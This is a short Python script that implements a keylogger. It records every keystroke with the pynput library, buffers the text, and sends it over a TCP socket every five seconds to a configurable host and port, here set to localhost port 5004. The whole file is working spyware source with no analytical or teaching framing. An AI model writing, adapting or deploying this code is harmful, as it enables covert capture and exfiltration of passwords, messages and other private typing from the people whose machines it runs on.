def keylog(HOST,PORT):
    from pynput import keyboard
    import socket
    import time
    import threading

    state = {
        "buffer": "",
        "socket": None
    }

    def on_press(key, st):
        try:
            st["buffer"] += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                st["buffer"] += ' '
            elif key == keyboard.Key.enter:
                st["buffer"] += '\n'
            elif key == keyboard.Key.backspace and st["buffer"]:
                st["buffer"] = st["buffer"][:-1]
            else:
                st["buffer"] += f'<{key}>'

        st["socket"] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        st["socket"].connect((HOST, PORT))

    def send_buffer(st):
        while True:
            time.sleep(5)
            if st["buffer"]:
                st["socket"].sendall(st["buffer"].encode("utf-8"))
                st["buffer"] = ''

    # we can use a lambda or partial to capture 'st':
    from functools import partial
    listener = keyboard.Listener(on_press=partial(on_press, st=state))
    listener.start()

    t = threading.Thread(target=send_buffer, args=(state,), daemon=True)
    t.start()

    listener.join()

if __name__ == '__main__':
    HOST = "127.0.0.1"
    PORT = 5004

    keylog(HOST,PORT)
